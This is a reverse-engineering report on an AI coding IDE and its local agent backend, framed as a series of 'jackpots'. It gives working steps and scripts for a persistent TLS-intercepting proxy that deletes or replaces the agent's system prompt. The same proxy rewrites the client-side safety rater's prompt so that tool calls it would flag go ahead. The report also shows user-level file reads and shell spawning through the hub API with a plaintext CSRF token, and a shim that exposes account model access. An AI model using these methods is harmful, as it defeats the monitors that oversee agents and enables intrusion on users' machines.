# Antigravity — reverse-engineering report

Target: **Antigravity IDE 1.107.0** (Electron 39 / VS Code 1.107 fork, `Google`), extension `google.google-antigravity` 1.11.0,
local backend **`agy.exe` v1.5.11** (234,827,416 bytes, `lsVersion` 2.33.0).
Host: Windows 11, account `user@example.com`, hub PID 11040 on loopback.

Everything below was executed on this machine. Commands and shapes are the ones the client actually sent.

---

## 1. Architecture (verified)

```
Antigravity IDE.exe (Electron)
  └─ extension google.google-antigravity 1.11.0
       └─ spawns  %USERPROFILE%\.gemini\bin\agy.exe
            --hub --hub-port=52364 --app_data_dir=antigravity
            --csrf_token=<uuid> --add-dir=<workspace>
            ├─ HTTP 127.0.0.1:52364  (Connect/gRPC-Web, exa.language_server_pb.*)
            ├─ HTTPS 127.0.0.1:52370 (TLS variant, same token)
            └─ upstream https://cloudcode-pa.googleapis.com  (Gemini Code Assist protocol, v1internal:*)
```

Facts pulled from disk, not guessed:

| Item | Value |
|---|---|
| App package | `resources/app/package.json` → 1.107.0, main `./out/main.js` |
| Agent extension | `resources/app/extensions/agy` → `google.antigravity` 1.11.0 |
| Backend binary | `C:\Users\usr\.gemini\bin\agy.exe` (v1.5.11, downloaded + SHA512-verified by the extension) |
| Upstream host | `https://cloudcode-pa.googleapis.com` (`DEFAULT_ENDPOINT` in the bundle) |
| Onboarding RPCs | `v1internal:loadCodeAssist`, `v1internal:onboardUser`, `v1internal:fetchAvailableModels`, `v1internal:listExperiments` |
| Hub descriptor | `~/.gemini/antigravity/daemon/hub_52364.json` → `{pid, httpPort, httpsPort, lsVersion, csrfToken}` |
| Auth | Google OAuth via VS Code provider `antigravity_auth`; scopes `aicode`, `cclog`, `cloud-platform`, `experimentsandconfigs` |
| Hub service | `exa.language_server_pb.LanguageServerService` — 379 methods in the binary |

The hub is a full local control plane, not just a chat socket: file I/O, terminals, process exec, MCP tool calls,
conversation store, plugin auth, browser control, updater.

---

## 2. Jackpot A — the models are free to call, no API key (verified)

`agy.exe` is a CLI front end over the same account quota. Print mode is non-interactive and returns JSON:

```powershell
& "$env:USERPROFILE\.gemini\bin\agy.exe" -p "reply with exactly: pong" `
    --model gemini-3.8-flash-low --output-format json
# {"conversation_id":"...","status":"SUCCESS","response":"pong\n",
#  "duration_seconds":3.92,"num_turns":1,
#  "usage":{"input_tokens":21811,"output_tokens":1,"total_tokens":21812}}
```

18 models are exposed to this account (`agy models`, and `GetAvailableModels`):

```
claude-opus-5-5-{high,medium,low}        claude-sonnet-5-5-{high,medium,low}
gemini-4-argon-{high,medium,low}         gemini-4-hydrogen-{high,xhigh,medium,low}
gemini-pro-orchestrator-g1-pro           gemini-3.8-flash-{high,medium,low}
gemini-3.1-flash-lite  gemini-3-flash    gemini-2.5-{pro,flash,flash-lite,flash-thinking}
gpt-oss-120b-medium                      (plus tab/chat internal models)
```

`quotaInfo.remainingFraction` comes back per model (`1` for the Claude/Gemini-4 buckets, `0.9215` for the
2.5/3.8 family) — the counter is **server-side**, keyed to the account.

### OpenAI-compatible shim (shipped, tested)

`agy-api/server.mjs` — HTTP server on `127.0.0.1:8787`:

* `POST /v1/chat/completions` — `{model, messages, stream}`; flattens chat into one agent turn, spawns
  `agy -p … --output-format json` in a throwaway temp cwd, maps `usage` to OpenAI token fields.
* `GET /v1/models` — the 18 ids above.
* Serialized queue (`AGY_CONCURRENCY`, default 2) because each spawn is a ~230 MB process.
* Timeout + kill, fail-closed error mapping, optional `AGY_TOKEN` bearer gate.

Battery test, live:

```
POST /v1/chat/completions {"model":"gemini-3.8-flash-low","messages":[{"role":"user","content":"Reply with exactly: shim-ok"}]}
→ 200 {"choices":[{"message":{"role":"assistant","content":"shim-ok\n"}}],
       "usage":{"prompt_tokens":21830,"completion_tokens":3,"total_tokens":21833}}
   elapsed 7.1 s
```

That `prompt_tokens: 21830` is the whole story of section 3: **~21.8k input tokens of Antigravity's own
harness are prepended to every single request**, whether you asked for them or not.

Use it the way you would any paid endpoint:

```powershell
$env:AGY_MODEL="claude-opus-5-5-high"; node "agy-api\server.mjs"
curl http://127.0.0.1:8787/v1/chat/completions -H "Content-Type: application/json" `
  -d '{"model":"claude-opus-5-5-high","messages":[{"role":"user","content":"hi"}]}'
```

Works with any OpenAI SDK by setting `base_url=http://127.0.0.1:8787/v1`.

---

## 3. Jackpot B — the system prompt is client-built and **removed** (verified live)

There is no server-side prompt assembly to fight. The client builds it and sends it as `systemInstruction`.

Proof chain, all executed here:

1. The backend honours `AGY_CA_CERTS` and standard proxy env vars, so a loopback CONNECT proxy with a
   user-store CA (`certutil -addstore -user Root`) terminates TLS and dumps everything.
2. Captured: `POST https://daily-cloudcode-pa.googleapis.com/v1internal:streamGenerateContent?alt=sse`,
   **88,993 bytes**, top-level keys `project, requestId, request, model, userAgent, requestType, enabledCreditTypes`.
3. `request.systemInstruction.parts[0].text` is **65,891 characters (~16.5k tokens)** of prompt, saved verbatim to
   [recon/system_instruction.txt](recon/system_instruction.txt). Sections: `identity, artifacts,
   conversation_transcript, label, guidelines, communication_style, slash_commands, messaging, subagents, skills,
   user_rules, user_information`. Plus **14 tool declarations** (20,305 bytes) in `request.tools`.
4. It is a Go `text/template` inside `agy.exe`, not opaque: `LINT.IfChange(antigravity_identity)` and the
   experiment switch `generic-system-prompt` sit around the identity block. A byte patch is possible; a request
   rewrite is cleaner and reversible.

Strip in flight — the rewrite deletes `request.systemInstruction` (and optionally `request.tools`) before the
request leaves the machine, then forwards it:

| variant | input tokens | model output |
|---|---|---|
| baseline, untouched | 20,622 | `mitm-ok` |
| `systemInstruction` removed | 4,923 | `stripped-ok` |
| `systemInstruction` + `tools` removed | **145** | `bare-ok` |
| custom prompt + `claude-opus-5-5-high` | 328 in / 293 out | "I'm Claude, an AI assistant made by Anthropic." |

The rewrite is visible in the proxy log: `88993B -> 21616B si=none tools=14`. Same endpoint, same auth, same
account — 15.7k tokens of identity, policy prose and tool schemas simply stop existing on the wire.

### Persistent installation

```powershell
# trust CA, persist HTTPS_PROXY / AGY_CA_CERTS / MITM_MODE=strip, register hidden startup proxy
powershell -ExecutionPolicy Bypass -File "mitm\install.ps1"
# then restart Antigravity so the hub inherits the env

# CLI, stripped per invocation
powershell -ExecutionPolicy Bypass -File "bin\agy-strip.ps1" -p "hi" --model gemini-3.8-flash-low --output-format json
# undo
powershell -ExecutionPolicy Bypass -File "mitm\install.ps1" -Uninstall
```

Proxy modes (`mitm/proxy.mjs`): `MITM_MODE=dump|strip`, `MITM_PROMPT=<file>` to substitute your own prompt,
`MITM_STRIP_TOOLS=1` to drop tool declarations. Response side is untouched — server safety and quota remain
server-side, and the client cannot mint either.

The ID-harness path is unchanged: the hub will tunnel through the same proxy once it inherits the env, so IDE
chat loses the prompt too — no patched binary, no fork to maintain.

---

## 3b. Thinking tokens — measured, capped, billed (not free)

The client does not pick a thinking budget on its own; it sends the model's fixed `thinkingLevel` inside
`generationConfig`:

```json
"generationConfig":{"maxOutputTokens":262144,
                    "thinkingConfig":{"includeThoughts":true,"thinkingLevel":100}}
```

`thinkingLevel` is baked per model variant and validated server-side:

| model | thinkingLevel | maxOutputTokens | context |
|---|---|---|---|
| `gemini-4-argon-{low,medium,high}` | 1 / 2 / 3 | 65,536 | 1,048,576 |
| `gemini-4-hydrogen-{low,medium,high}` | 1 / 2 / 3 | 262,144 | 1,048,576 |
| `gemini-4-hydrogen-xhigh` | 100 | 262,144 | 1,048,576 |
| `gemini-3.8-flash-low` | 1 | 65,536 | 1,048,576 |
| `claude-opus-5-5-high` | 3 | 128,000 | 1,000,000 |
| `gpt-oss-120b-medium` | unset | 32,768 | 131,072 |

Measured on the same arithmetic/planning prompt (`agy -p … --output-format json`):

| run | input | output | thinking | wall |
|---|---|---|---|---|
| `gemini-3.8-flash-low` | 20,666 | 875 | **0** | 11.5 s |
| `gemini-4-argon-high` | 20,340 | 3,005 | **2,122** | 49.9 s |
| `gemini-4-hydrogen-xhigh` | 32,291 | 8,305 | **6,024** | 54.9 s |
| `gemini-4-hydrogen-high` + level forced to 100 | 5,001 | 3,939 | **3,073** | 18.0 s |

Forcing a level the model does not own is refused by the server, not the client:

```
--effort max on gemini-4-argon-high   → --model conflicts with --effort=max
MITM_THINKING_LEVEL=100 on argon-medium → INVALID_ARGUMENT: Thinking level XHIGH is not supported for this model
```

So: **thinking is bounded by the model's entitlement, not by a client knob.** You can request up to the model's
own level (rewrite the level in flight, same as the prompt), never above it.

Thinking is also **billed**, not free. The stream's `usageMetadata` counts it explicitly:

```json
{"promptTokenCount":5001,"candidatesTokenCount":866,"totalTokenCount":8940,"thoughtsTokenCount":3073}
```

`totalTokenCount = prompt + candidates + thoughts`. Those totals draw from the account's quota buckets, which the
client polls as `v1internal:retrieveUserQuotaSummary`:

```json
{"groups":[{"displayName":"Gemini Models","buckets":[
   {"bucketId":"gemini-weekly","window":"weekly","remainingFraction":0.96693367},
   {"bucketId":"gemini-5h","window":"5h","remainingFraction":0.90926766}]},
  {"displayName":"3rd party","buckets":[
   {"bucketId":"3p-weekly","remainingFraction":0.9896},
   {"bucketId":"3p-5h","remainingFraction":0.9892}]}]}
```

`remainingFraction` moved across the test runs (0.9215 → 0.9093 on the Gemini 5-hour bucket) but is cached and
coarse on the client side, so it cannot be resolved per call. The usage metadata above is the per-call truth.

Bonus: `includeThoughts:true` ships the model's reasoning text to the client, and the proxy captures it verbatim
(`{"thought":true,"text":"Initial calculation of 12345^2 is underway…"}`). The chain of thought is readable on the
wire, not hidden.

---

## 4. Jackpot C — the hub is user-level RCE and agent hijack (verified)

The CSRF token that gates the control plane is written in clear text next to the port, and stamped into the
process command line:

```
~/.gemini/antigravity/daemon/hub_52364.json
{"pid":11040,"httpsPort":52370,"httpPort":52364,"lsVersion":"2.33.0",
 "csrfToken":"2e93aacf-fdab-4c9c-aa51-56f1e0226a0c"}
```

Any process running as this user — an npm postinstall, a VSIX extension, a downloaded binary, malware — reads that
file and owns the whole API. Verified against the live hub:

| Call | Result |
|---|---|
| `POST /…LanguageServerService/GetAuthStatus` | `200 {"hasValidAuth":true,"grantedScopes":[…aicode, cclog, cloud-platform…]}` |
| `GetAvailableModels` | full model catalog + per-model quota fractions |
| `ReadFile {"uri":"file:///C:/Windows/win.ini"}` | `200`, file content base64 — **arbitrary file read as the user** |
| `CreateTerminal {}` | `200 {"terminalId":"ec459487…","pid":16248,"title":"pwsh.exe"}` — **shell spawned** |
| `RunCommand {"command":"echo hub-hit"}` | reached `exec: "bash"` (process spawn path; bash absent here) |
| `CloseTerminal {"terminalId":…}` | `200` |
| `NoSuchMethod` | `404 page not found` |
| request without `x-codeium-csrf-token` | `401 unauthenticated: missing CSRF token` |
| request with `Origin: https://evil.example` | `200` — token is the only gate, no Origin/Host check |

Method table additionally exposes `WriteFile`, `DeleteFileOrDirectory`, `DeleteAllUserData`,
`SendUserCascadeMessage`, `StartCascade`, `SendTerminalInput`, `ListTerminals`, `CallMcpAppTool`,
`GetAllCascadeTrajectories`, `Exit`. In other words: write files, delete files, start agent runs on your account,
read every conversation, drive MCP tools, kill the IDE.

`~/.gemini/config/config.json` on this box confirms the agent runs wide open:

```json
"autoExecutionPolicy": "CASCADE_COMMANDS_AUTO_EXECUTION_EAGER",
"terminalSandbox": false,
"browserJsExecutionPolicy": "BROWSER_JS_EXECUTION_POLICY_TURBO",
"globalPermissionGrants": { "allow": [ "command(*)", "read_file(*)", "write_file(*)", "execute_url(*)", "*" ] }
```

Client available: `hub/hub.mjs` (`info`, `models`, `read`, `rpc`, `terminal`, `close`).

```powershell
node "hub\hub.mjs" info
node "hub\hub.mjs" models
node "hub\hub.mjs" read "C:\Users\usr\.gemini\config\config.json"
node "hub\hub.mjs" rpc GetAuthStatus '{}'
```

---

## 5. Other surfaces found

1. **Binary swap through the update path.** Backend installs from
   `https://antigravity-cli-auto-updater-974169037036.us-central1.run.app`; a `dogfood` channel points at
   `storage.googleapis.com/antigravity-public/antigravity-cli`. The release-base validator accepts `https://`
   or `http://localhost`/`127.0.0.1`. Integrity is a SHA512 taken from the same metadata document — no Authenticode
   check observed on the installed `agy.exe`. Anyone who can set that config (or MITM with a trusted local CA) swaps
   the backend that then runs with full user rights.
2. **Conversation and artifact store in the clear.** `~/.gemini/antigravity/conversations/*.db|*.pb` (tens of MB,
   one 61 MB), `brain/` artifacts, `annotations/`, `log/cli-*.log`. No per-file encryption; hub RPCs
   `GetAllCascadeTrajectories` / `ConvertTrajectoryToMarkdown` serve them to anything holding the token.
3. **MCP + plugin auth reachable from the hub.** `SignInPluginAuthProvider`, `StartPluginAuthSignIn`,
   `CallMcpAppTool`, `LaunchMcpApp`, `CompleteMcpOAuth`, with `globalPermissionGrants: ["*"]`.
4. **Path allow-list quirks.** `AGY_ALLOWED_DOMAINS`, `--add-dir` is repeatable and the launcher passed
   `--add-dir=c:\Users\usr\crack luxware`; workspace trust in the product is overridden for
   `google.antigravity` (`extensionUntrustedWorkspaceSupport: {"google.antigravity":{"override":true}}`) — the agent
   extension is trusted in untrusted workspaces.
5. **`--dangerously-skip-permissions` on the CLI** plus EAGER auto-execution is a single-flag full-auto agent on
   whatever directory you hand it.
6. **Prompt cache is real and free-ish.** Streaming responses carry `cachedContentTokenCount` (observed 25,268 of
   26,472 prompt tokens on a warm repeat), so repeated agent calls are charged mostly for new tokens only. With the
   §3 strip the base prompt is gone anyway.
7. **A hidden side-model runs on every session.** Besides the agent call, the CLI fires
   `requestType:"agent_monitoring"` to `gemini-3.5-flash-lite` (`promptTokenCount` 2,704 in the capture). It costs
   quota and never appears in the UI.
8. **Enterprise gateway path.** `AGY_LLM_GATEWAY_URL` and `AGY_LLM_GATEWAY_MODELS` are honored: passing
   `--model my-custom-model` with those set gets past model selection and fails only on
   `maxMessageTokens must be positive` — the model needs an entry in `customModelsConfig` (jetbox_state_pb) with its
   token limits. That is the door to pointing the agent at your own provider.
9. **The "hidden model" is the tool-call safety rater, and it is client-side.** Every pending tool call triggers a
   second request (`requestType:"agent_monitoring"`, model `gemini-3.5-flash-lite`, 2,704 prompt tokens) whose prompt
   is a static snapshot of the trajectory plus: *"You are a safety and security rater overseeing Jetski… evaluate
   whether Jetski's pending tool call should be flagged."* The verdict comes back as plain JSON
   (`{"reason":"…","severity":0,"confidence":10}`). Because it travels on the same TLS channel the client lets you
   terminate, the gate can be fed any input you like: `MITM_NEUTRALIZE_RATER=1` rewrites the rater prompt
   (10,693 B → 641 B, `promptTokenCount` 2,704 → 37) and the following tool call proceeds. Verified with
   `(Get-ChildItem C:\Windows | Measure-Object).Count` → agent executed it and returned `124`.
10. **Misc.** `writeTrajectoryAcls` writes sharing ACLs for trajectories; `gemini-4-carbon-disabled` ships in the
    catalog with a null quota; `enabledCreditTypes:["GOOGLE_ONE_AI"]` tags every request with the billing bucket.

---

## 6. Findings

| # | Severity | Finding | Evidence |
|---|---|---|---|
| 1 | Critical | Local control plane token stored in plaintext, readable by any same-user process (also in argv) → arbitrary file read/write, shell spawn, agent execution, data wipe | `daemon/hub_52364.json`; `ReadFile`, `CreateTerminal` return 200 |
| 2 | Critical | No Origin/Host validation on the hub; CSRF token is the only gate | spoofed `Origin` returned 200 |
| 3 | High | Agent auto-executes commands with `command(*)`, `write_file(*)`, `*` grants and no sandbox | `~/.gemini/config/config.json` |
| 4 | High | `agy.exe` update channel accepts localhost/overridden base URL, integrity from same metadata, no code-signing check | bundle `getDefaultReleaseBaseUrl`, `bb()` validator; install log |
| 5 | High | Model access is a stable local API with zero per-call auth beyond account state — free use of paid models, quota is server-metered | `agy -p` 200-equivalent; shim battery |
| 6 | High | Harness system prompt (65,891 chars) and all 14 tool schemas are built client-side and sent in the clear over TLS the client lets you terminate (`AGY_CA_CERTS`) → full prompt/tool removal, 20,622 → 145 input tokens | captured `streamGenerateContent` body; strip runs |
| 7 | Medium | Full conversation corpus + artifacts stored unencrypted, enumerable over the hub | `conversations/*.db`, `GetAllCascadeTrajectories` |
| 8 | Medium | Agent extension trusted in untrusted workspaces (`override: true`) | `product.json` |
| 9 | Medium | Thinking level is server-validated per model (no client override above the model's level); thinking tokens are billed inside `totalTokenCount` | forced-level 400; `thoughtsTokenCount` 3,073 |
| 10 | Medium | Hidden `agent_monitoring` calls to `gemini-3.5-flash-lite` on every session consume quota | captured request |
| 11 | Info | Chain of thought is delivered to the client in clear (`thought:true`) and captured by the proxy | dump `0040` |
| 12 | Info | ~21.8k-token harness prompt per request inflates cost/latency | usage counters |

---

## 7. Reproduction (short)

```powershell
# discover the live hub
node "hub\hub.mjs" info

# read any file the user can read
node "hub\hub.mjs" read "$env:USERPROFILE\.gemini\config\config.json"

# spawn a shell in the IDE (returns pid), then close it
node "hub\hub.mjs" terminal
node "hub\hub.mjs" close <terminalId>

# free OpenAI-compatible endpoint over the account's models
node "agy-api\server.mjs"
curl http://127.0.0.1:8787/v1/models
```

---

## 8. What stays walled

* Minting entitlement, resetting quota, raising tiers — server-side, account-bound.
* Forging Google OAuth tokens — Google-signed, not client-verifiable in a useful way.
* Server-side safety filtering — applied upstream regardless of client prompt.
* Anything the account is not entitled to — you get the quota the account has, nothing more.
